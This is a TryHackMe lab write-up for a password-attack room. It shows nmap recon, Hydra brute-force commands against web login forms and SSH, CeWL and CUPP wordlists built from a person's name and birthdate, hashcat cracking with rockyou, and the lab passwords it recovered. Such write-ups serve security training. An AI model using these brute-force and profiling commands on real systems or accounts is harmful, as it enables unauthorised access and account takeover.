# TryHackMe — Checkmate (Password Attacks) Write-up

## Recon

An `nmap` scan of the target revealed five services:

```bash
sudo nmap -sC -sV -T5 10.48.173.172
```

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
5000/tcp open  http    Operation Checkmate      (main app / instructions)
5001/tcp open  http    FirewallOS — Sign in
5002/tcp open  http    Engineering Careers
5003/tcp open  http    social.thm — Log in
```

Each level boils down to picking (or building) the right wordlist and throwing it at the service with **Hydra**.

---

## Level 1 — FirewallOS login (port 5001, http-post-form)

Tried common wordlists first (`fasttrack.txt`) with no hits, then moved to SecLists' default-credentials list:

```bash
sudo apt install seclists

hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  -f -V -t4 -s 5001 10.48.173.172 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

Result:

```
[5001][http-post-form] host: 10.48.173.172   login: admin   password: 12345
```

**Level 1 password:** `12345`

---

## Level 2 — Engineering Careers portal (port 5002, http-post-form)

Instead of guessing, the careers page itself was scraped for keywords with `cewl`, producing a targeted wordlist from the site's own content:

```bash
cewl -d 2 -m 6 --lowercase -w keywords.txt http://10.48.173.172:5002

hydra -l marco -P ~/Downloads/keywords.txt -f -V -t4 -s 5002 10.48.173.172 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

Result:

```
[5002][http-post-form] host: 10.48.173.172   login: marco   password: excellence
```

**Level 2 password:** `excellence`

---

## Level 3 — social.thm login (port 5003, http-post-form)

With a name (Marco Bianchi) and a plausible birthdate in hand (surfaced from the previous level), **CUPP** (Common User Passwords Profiler) was used to build a personalized wordlist, then fed to Hydra:

```bash
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
#  First Name: Marco
#  Surname:    Bianchi
#  Nickname:   marky
#  Birthdate:  14021995
#  -> add special chars: Y, add random numbers: Y

hydra -l marco -P marco.txt -f -V -t4 -s 5003 10.48.174.237 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

Result:

```
[5003][http-post-form] host: 10.48.174.237   login: marco   password: Bianchi2495
```

**Level 3 password:** `Bianchi2495`

---

## Level 4 — Hash cracking

The next stage provided a SHA-256 hash (of a filename tied to the social platform) instead of a live login. Cracked offline with `hashcat` against `rockyou.txt`:

```bash
echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash.txt
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

Result:

```
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:family
```

**Level 4 password:** `family`

---

## Level 5 — SSH (port 22)

The theme hinted at a corporate-buzzword + year pattern (e.g. "Security2024!"). A small custom wordlist generator (`./wlgen.py`) was used to combine a set of buzzwords with a year range, then the result was run against SSH with Hydra:

```bash
python3 ~/Downloads/wlgen.py -c security excellence innovation digital cloud -y 1990 2030 -o t5.txt
hydra -l marco -P t5.txt -f -V -t4 10.48.174.237 ssh
```

Result:

```
[22][ssh] host: 10.48.174.237   login: marco   password: Security2024!
```

**Level 5 password:** `Security2024!`

---

## Summary

| Level | Service                | Method                                | Password        |
|-------|--------------------------|----------------------------------------|-------------------|
| 1     | FirewallOS (5001)        | SecLists default-passwords + Hydra     | `12345`           |
| 2     | Careers portal (5002)    | CeWL-scraped wordlist + Hydra          | `excellence`      |
| 3     | social.thm (5003)        | CUPP profile wordlist + Hydra          | `Bianchi2495`     |
| 4     | Hash                     | Hashcat + rockyou.txt                  | `family`          |
| 5     | SSH (22)                 | Custom buzzword+year wordlist + Hydra  | `Security2024!`   |
